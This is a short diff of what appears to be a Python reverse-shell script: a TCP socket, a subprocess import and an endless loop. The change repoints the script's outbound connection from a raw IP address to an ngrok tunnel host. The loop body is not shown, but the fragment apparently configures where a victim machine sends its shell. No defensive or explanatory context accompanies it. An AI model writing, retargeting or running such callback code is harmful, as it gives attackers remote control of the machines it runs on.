@@ -5,7 +5,7 @@ import subprocess
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
-s.connect(('95.70.70.53', 8888))
+s.connect(('0.tcp.jp.ngrok.io', 13619))
 
 
 while True:
